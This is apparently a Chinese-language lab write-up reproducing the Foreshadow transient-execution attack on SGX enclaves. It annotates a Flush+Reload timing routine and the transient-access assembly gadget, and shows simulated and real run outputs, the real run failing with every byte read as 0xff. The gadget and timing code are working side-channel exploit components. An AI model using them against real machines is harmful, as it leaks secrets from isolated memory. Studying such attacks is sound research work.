# 代码解析

```c
inline unsigned long __attribute__((always_inline)) reload( void * adrs)
{
    volatile unsigned long time;  // 存储测量结果（强制防止编译器优化）

    asm volatile (
    "mfence\n\t"          // 内存屏障：确保之前的读写操作完成
    "lfence\n\t"          // 加载屏障：序列化加载操作
    "rdtsc\n\t"           // 读取第一次时间戳（低32位在eax，高32位在edx）
    "lfence\n\t"          // 确保rdtsc在后续指令前执行
    "movl %%eax, %%esi\n\t" // 保存第一次时间戳低32位到esi
    "movl (%1), %%eax\n\t"  // 从内存地址adrs加载数据到eax（触发缓存访问）
    "lfence\n\t"           // 序列化加载操作，确保内存访问完成
    "rdtsc\n\t"            // 读取第二次时间戳
    "subl %%esi, %%eax \n\t" // 计算两次时间戳低32位的差值（结果在eax）
    : "=a" (time)          // 输出：将eax（时间差）赋给time
    : "c" (adrs)           // 输入：将adrs存入ecx寄存器（%1对应ecx）
    : "%rsi", "%rdx");     // 告诉编译器esi和edx会被修改

    return time;
}
```

## **关键指令的作用**

1. `**mfence**` **和** `**lfence**`：

- **内存屏障**：确保之前的读写操作完成，避免乱序执行干扰测量。
- **加载屏障**：确保 `rdtsc` 和内存访问指令按顺序执行。

1. `**movl (%1), %%eax**`：

- 强制从内存地址 `adrs` 加载数据到寄存器 `eax`，触发以下行为：

- 如果 `adrs` 不在缓存中，需从内存加载，增加访问时间。
- 如果 `adrs` 已在缓存中，直接读取，减少访问时间。

1. **两次** `**rdtsc**` **的差值**：

- 计算两次时间戳的低32位差值（忽略高32位，假设两次调用间隔较短，不会溢出）。

## **在侧信道攻击中的作用**

1. **缓存探测（Cache Probing）**：

- 攻击者通过多次调用 `reload(adrs)`，测量访问 `adrs` 的时间，判断该地址是否被受害者程序访问过。
- 示例（Flush+Reload攻击）：

```c
flush_from_cache(adrs);      // 清空adrs的缓存
trigger_victim_access(adrs); // 触发受害者访问adrs
t = reload(adrs);            // 测量时间
if (t < CACHE_HIT_THRESHOLD) // 如果时间短，说明受害者访问过adrs
    recover_secret();
```

1. **隐蔽性**：

- 仅通过时间测量推断信息，无需直接读取受害者内存，适用于绕过硬件隔离（如SGX Enclave）。

# 实验结果

## 程序未修改运行结果

![img](https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1744035084198-6fd1f080-bdd3-4978-b6e6-1892e9ff8608-20250411173134127.png)

![img](https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1744035113413-bb90ebe4-b201-4a76-95f1-63800292c016-20250411173206124.png)

从结果可以看出来，预测的值均为`0xff`，与实际值存在一些相应的差异。

## 使用内存模拟 enclave 进行实验

通过修改程序中`SIM_ENCLAVE`的值实现，在未启用 EENTER（sgx 支持） 的情况下，通过 PoC 展示在已打补丁的微代码的 CPU 上的 FS 功能；

```c
make run
```

运行程序得到的输出：[📎simResult.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/34580676/1744200953741-e204eb3d-70d5-4899-9dc1-c740775f6055.txt)

```c
[main.c] verifying and destroying enclave secret..
    shadow[ 0]=0x67; enclave[ 0]=0x67    shadow[ 1]=0xc6; enclave[ 1]=0xc6
    shadow[ 2]=0x69; enclave[ 2]=0x69    shadow[ 3]=0x73; enclave[ 3]=0x73
    shadow[ 4]=0x51; enclave[ 4]=0x51    shadow[ 5]=0xff; enclave[ 5]=0xff
    shadow[ 6]=0x4a; enclave[ 6]=0x4a    shadow[ 7]=0xec; enclave[ 7]=0xec
    shadow[ 8]=0x29; enclave[ 8]=0x29    shadow[ 9]=0xcd; enclave[ 9]=0xcd
    shadow[10]=0xba; enclave[10]=0xba    shadow[11]=0xab; enclave[11]=0xab
    shadow[12]=0xf2; enclave[12]=0xf2    shadow[13]=0xfb; enclave[13]=0xfb
    shadow[14]=0xe3; enclave[14]=0xe3    shadow[15]=0x46; enclave[15]=0x46
    shadow[16]=0x7c; enclave[16]=0x7c    shadow[17]=0xc2; enclave[17]=0xc2
    shadow[18]=0x54; enclave[18]=0x54    shadow[19]=0xf8; enclave[19]=0xf8
    shadow[20]=0x1b; enclave[20]=0x1b    shadow[21]=0xe8; enclave[21]=0xe8
    shadow[22]=0xe7; enclave[22]=0xe7    shadow[23]=0x8d; enclave[23]=0x8d
    shadow[24]=0x76; enclave[24]=0x76    shadow[25]=0x5a; enclave[25]=0x5a
    shadow[26]=0x2e; enclave[26]=0x2e    shadow[27]=0x63; enclave[27]=0x63
    shadow[28]=0x33; enclave[28]=0x33    shadow[29]=0x9f; enclave[29]=0x9f
    shadow[30]=0xc9; enclave[30]=0xc9    shadow[31]=0x9a; enclave[31]=0x9a
    shadow[32]=0x66; enclave[32]=0x66    shadow[33]=0x32; enclave[33]=0x32
    shadow[34]=0x0d; enclave[34]=0x0d    shadow[35]=0xb7; enclave[35]=0xb7
    shadow[36]=0x31; enclave[36]=0x31    shadow[37]=0x58; enclave[37]=0x58
    shadow[38]=0xa3; enclave[38]=0xa3    shadow[39]=0x5a; enclave[39]=0x5a
    shadow[40]=0x25; enclave[40]=0x25    shadow[41]=0x5d; enclave[41]=0x5d
    shadow[42]=0x05; enclave[42]=0x05    shadow[43]=0x17; enclave[43]=0x17
    shadow[44]=0x58; enclave[44]=0x58    shadow[45]=0xe9; enclave[45]=0xe9
    shadow[46]=0x5e; enclave[46]=0x5e    shadow[47]=0xd4; enclave[47]=0xd4
    shadow[48]=0xab; enclave[48]=0xab    shadow[49]=0xb2; enclave[49]=0xb2
    shadow[50]=0xcd; enclave[50]=0xcd    shadow[51]=0xc6; enclave[51]=0xc6
    shadow[52]=0x9b; enclave[52]=0x9b    shadow[53]=0xb4; enclave[53]=0xb4
    shadow[54]=0x54; enclave[54]=0x54    shadow[55]=0x11; enclave[55]=0x11
    shadow[56]=0x0e; enclave[56]=0x0e    shadow[57]=0x82; enclave[57]=0x82
    shadow[58]=0x74; enclave[58]=0x74    shadow[59]=0x41; enclave[59]=0x41
    shadow[60]=0x21; enclave[60]=0x21    shadow[61]=0x3d; enclave[61]=0x3d
    shadow[62]=0xdc; enclave[62]=0xdc    shadow[63]=0x87; enclave[63]=0x87
[foreshadow.c] [OK] Foreshadow correctly derived all 64 bytes!
```

模拟实验得到的结果符合预期。

## 输出测信道预测结果

通过修改代码直接性输出测信道的时间戳，发现是每次都会存在一个结果是预测成功的。

```c
static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
{
    void *slot_ptr;
    int i, fault_fired = 0;
    for (i=0; i < NUM_SLOTS; i++)
    {
        slot_ptr = SLOT_OFFSET( fs_oracle, i );
        flush( slot_ptr );

        /* Use TSX transaction support for exception supression */
        if ( rtm_begin() == 0 )
            transient_access(fs_oracle, adrs, SLOT_SIZE);

        if (reload( slot_ptr ) < fs_reload_threshold)
            return i;
    }
    #else
    for (i=0; i < NUM_SLOTS; i++)
        flush( SLOT_OFFSET( fs_oracle, i ) );

    transient_access(fs_oracle, adrs, SLOT_SIZE);

    for (i=0; i < NUM_SLOTS; i++){
        /* this is custom code */
        int tmpTime = reload(SLOT_OFFSET(fs_oracle, i));
        if(tmpTime < fs_reload_threshold){
            printf("测信道时间戳：%d，序号：%d\n", tmpTime, i);
            return i;
        }
    }
    #endif

    return 0;
}
```

[📎foreshadow-result-修改汇编输出.txt](https://www.yuque.com/attachments/yuque/0/2025/txt/34580676/1744201657319-80226b0d-ee0f-4533-a021-b57d734d3e99.txt)

```c
[main.c] extracting secret from L1 cache..
SIGSEGV错误发生第1次
测信道时间戳：84，序号：255
SIGSEGV错误发生第2次
测信道时间戳：86，序号：255
SIGSEGV错误发生第3次
测信道时间戳：78，序号：255
SIGSEGV错误发生第4次
测信道时间戳：84，序号：255
SIGSEGV错误发生第5次
测信道时间戳：84，序号：255
SIGSEGV错误发生第6次
测信道时间戳：88，序号：255
SIGSEGV错误发生第7次
测信道时间戳：86，序号：255
SIGSEGV错误发生第8次
测信道时间戳：86，序号：255
SIGSEGV错误发生第9次
测信道时间戳：86，序号：255
SIGSEGV错误发生第10次
测信道时间戳：84，序号：255
SIGSEGV错误发生第11次
测信道时间戳：84，序号：255
SIGSEGV错误发生第12次
测信道时间戳：90，序号：255
SIGSEGV错误发生第13次
测信道时间戳：86，序号：255
SIGSEGV错误发生第14次
测信道时间戳：86，序号：255
SIGSEGV错误发生第15次
测信道时间戳：84，序号：255
SIGSEGV错误发生第16次
测信道时间戳：86，序号：255
SIGSEGV错误发生第17次
测信道时间戳：84，序号：255
SIGSEGV错误发生第18次
测信道时间戳：86，序号：255
SIGSEGV错误发生第19次
测信道时间戳：84，序号：255
SIGSEGV错误发生第20次
测信道时间戳：84，序号：255
SIGSEGV错误发生第21次
测信道时间戳：86，序号：255
SIGSEGV错误发生第22次
测信道时间戳：86，序号：255
SIGSEGV错误发生第23次
测信道时间戳：84，序号：255
SIGSEGV错误发生第24次
测信道时间戳：86，序号：255
SIGSEGV错误发生第25次
测信道时间戳：86，序号：255
SIGSEGV错误发生第26次
测信道时间戳：86，序号：255
SIGSEGV错误发生第27次
测信道时间戳：86，序号：255
SIGSEGV错误发生第28次
测信道时间戳：84，序号：255
SIGSEGV错误发生第29次
测信道时间戳：86，序号：255
SIGSEGV错误发生第30次
测信道时间戳：86，序号：255
SIGSEGV错误发生第31次
测信道时间戳：84，序号：255
SIGSEGV错误发生第32次
测信道时间戳：84，序号：255
SIGSEGV错误发生第33次
测信道时间戳：86，序号：255
SIGSEGV错误发生第34次
测信道时间戳：86，序号：255
SIGSEGV错误发生第35次
测信道时间戳：84，序号：255
SIGSEGV错误发生第36次
测信道时间戳：86，序号：255
SIGSEGV错误发生第37次
测信道时间戳：84，序号：255
SIGSEGV错误发生第38次
测信道时间戳：86，序号：255
SIGSEGV错误发生第39次
测信道时间戳：86，序号：255
SIGSEGV错误发生第40次
测信道时间戳：84，序号：255
SIGSEGV错误发生第41次
测信道时间戳：86，序号：255
SIGSEGV错误发生第42次
测信道时间戳：84，序号：255
SIGSEGV错误发生第43次
测信道时间戳：84，序号：255
SIGSEGV错误发生第44次
测信道时间戳：86，序号：255
SIGSEGV错误发生第45次
测信道时间戳：84，序号：255
SIGSEGV错误发生第46次
测信道时间戳：86，序号：255
SIGSEGV错误发生第47次
测信道时间戳：86，序号：255
SIGSEGV错误发生第48次
测信道时间戳：84，序号：255
SIGSEGV错误发生第49次
测信道时间戳：84，序号：255
SIGSEGV错误发生第50次
测信道时间戳：86，序号：255
SIGSEGV错误发生第51次
测信道时间戳：86，序号：255
SIGSEGV错误发生第52次
测信道时间戳：84，序号：255
SIGSEGV错误发生第53次
测信道时间戳：84，序号：255
SIGSEGV错误发生第54次
测信道时间戳：84，序号：255
SIGSEGV错误发生第55次
测信道时间戳：86，序号：255
SIGSEGV错误发生第56次
测信道时间戳：86，序号：255
SIGSEGV错误发生第57次
测信道时间戳：86，序号：255
SIGSEGV错误发生第58次
测信道时间戳：86，序号：255
SIGSEGV错误发生第59次
测信道时间戳：86，序号：255
SIGSEGV错误发生第60次
测信道时间戳：88，序号：255
SIGSEGV错误发生第61次
测信道时间戳：86，序号：255
SIGSEGV错误发生第62次
测信道时间戳：84，序号：255
SIGSEGV错误发生第63次
测信道时间戳：86，序号：255
SIGSEGV错误发生第64次
测信道时间戳：88，序号：255
[main.c] verifying and destroying enclave secret..
 ** shadow[ 0]=0xff; enclave[ 0]=0xb5 ** shadow[ 1]=0xff; enclave[ 1]=0x2b
 ** shadow[ 2]=0xff; enclave[ 2]=0x1f ** shadow[ 3]=0xff; enclave[ 3]=0xe7
 ** shadow[ 4]=0xff; enclave[ 4]=0x3d ** shadow[ 5]=0xff; enclave[ 5]=0x15
 ** shadow[ 6]=0xff; enclave[ 6]=0xaf ** shadow[ 7]=0xff; enclave[ 7]=0xa7
 ** shadow[ 8]=0xff; enclave[ 8]=0x95 ** shadow[ 9]=0xff; enclave[ 9]=0x53
 ** shadow[10]=0xff; enclave[10]=0x6e ** shadow[11]=0xff; enclave[11]=0xd9
 ** shadow[12]=0xff; enclave[12]=0x42 ** shadow[13]=0xff; enclave[13]=0xec
 ** shadow[14]=0xff; enclave[14]=0xe8 ** shadow[15]=0xff; enclave[15]=0x65
 ** shadow[16]=0xff; enclave[16]=0x22 ** shadow[17]=0xff; enclave[17]=0xe2
 ** shadow[18]=0xff; enclave[18]=0xec ** shadow[19]=0xff; enclave[19]=0x5b
 ** shadow[20]=0xff; enclave[20]=0xad ** shadow[21]=0xff; enclave[21]=0x64
 ** shadow[22]=0xff; enclave[22]=0xba ** shadow[23]=0xff; enclave[23]=0xd5
 ** shadow[24]=0xff; enclave[24]=0xbc ** shadow[25]=0xff; enclave[25]=0xed
 ** shadow[26]=0xff; enclave[26]=0x8f ** shadow[27]=0xff; enclave[27]=0x82
 ** shadow[28]=0xff; enclave[28]=0x1a ** shadow[29]=0xff; enclave[29]=0x28
 ** shadow[30]=0xff; enclave[30]=0x54 ** shadow[31]=0xff; enclave[31]=0x43
 ** shadow[32]=0xff; enclave[32]=0xb7 ** shadow[33]=0xff; enclave[33]=0xe1
 ** shadow[34]=0xff; enclave[34]=0x5a ** shadow[35]=0xff; enclave[35]=0x31
 ** shadow[36]=0xff; enclave[36]=0x5a ** shadow[37]=0xff; enclave[37]=0x75
 ** shadow[38]=0xff; enclave[38]=0x04 ** shadow[39]=0xff; enclave[39]=0x0a
 ** shadow[40]=0xff; enclave[40]=0x31 ** shadow[41]=0xff; enclave[41]=0x92
 ** shadow[42]=0xff; enclave[42]=0x4c ** shadow[43]=0xff; enclave[43]=0xb8
 ** shadow[44]=0xff; enclave[44]=0x91 ** shadow[45]=0xff; enclave[45]=0x3c
 ** shadow[46]=0xff; enclave[46]=0x20 ** shadow[47]=0xff; enclave[47]=0x44
 ** shadow[48]=0xff; enclave[48]=0x0b ** shadow[49]=0xff; enclave[49]=0x45
 ** shadow[50]=0xff; enclave[50]=0x7e ** shadow[51]=0xff; enclave[51]=0x9a
 ** shadow[52]=0xff; enclave[52]=0xf9 ** shadow[53]=0xff; enclave[53]=0x62
 ** shadow[54]=0xff; enclave[54]=0xed ** shadow[55]=0xff; enclave[55]=0x4e
 ** shadow[56]=0xff; enclave[56]=0xd4 ** shadow[57]=0xff; enclave[57]=0x3c
 ** shadow[58]=0xff; enclave[58]=0x6f ** shadow[59]=0xff; enclave[59]=0x60
 ** shadow[60]=0xff; enclave[60]=0x2e ** shadow[61]=0xff; enclave[61]=0x3c
 ** shadow[62]=0xff; enclave[62]=0x73 ** shadow[63]=0xff; enclave[63]=0xa8
[foreshadow.c] [FAIL] Foreshadow missed 64 bytes out of 64 :/
```

根据输出的结果可以发现，确实是每次都存在一个测信道的访问时间相对较小，这个实验结果表明，我们的瞬态执行函数确实执行啦，且访问的是是下标 255 所对应的内存空间，但是这个就产生了一个问题，为什么所有的访问都是 255 对应的内存空间呢？

```c
    .text
    .global transient_access
    # %rdi: oracle（攻击者控制的探测数组基地址）
    # %rsi: secret_ptr（目标秘密数据地址）
    # %rdx: slot_size（探测数组的槽位大小，需为2的幂

transient_access:
    mov $0, %rax           # 初始化 rax 为 0
    tzcnt %rdx, %rcx       # 计算 slot_size 的以2为底的对数（tzcnt统计末尾0的位数）
    #prefetcht0 (%rsi)     # （注释掉的预取指令，若启用则预加载 secret 到缓存）

retry:
    movb (%rsi), %al       # 从 secret_ptr 读取一个字节到 al（rax 的低8位）
    shl %cl, %rax          # 将 rax 左移 cl 位（cl=log2(slot_size)，计算偏移量）
    jz retry               # 若偏移量为0（即读取的字节为0），则重试
    movq (%rdi, %rax), %rdi # 访问 oracle + 偏移量 处的内存（触发缓存加载）
    retq                   # 返回
```

根据瞬态执行函数的汇编代码可以知道，每次访问的应该是对应字节的内存空间，从而导致该字节对应的内存空间的访问时间变短，那么我们根据实验调试得到的结果表明，enclave 内存空间中所有的值都是`0xff`，但是这从观念上来说就是不正确的，但是实验结果又表明了这个现象；
这里还有一个现象就是每次预测字节都会产生一次`SIGSEGV`信号的错误，意味着我们确实是对 enclave 区域进行了访问。

## 不进行瞬态执行

通过注释掉`transient_access(fs_oracle, adrs, SLOT_SIZE);`函数的执行实现，这时候我们再次运行程序可以观察到的结果是没有符合条件的测信道时间戳输出，因此我们更加可以确定瞬态执行确确实实执行了，而且获取到了数据进行访问。

![img](https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1744268454002-fedb8421-8e2f-4e61-b6a9-df44356ae124.png)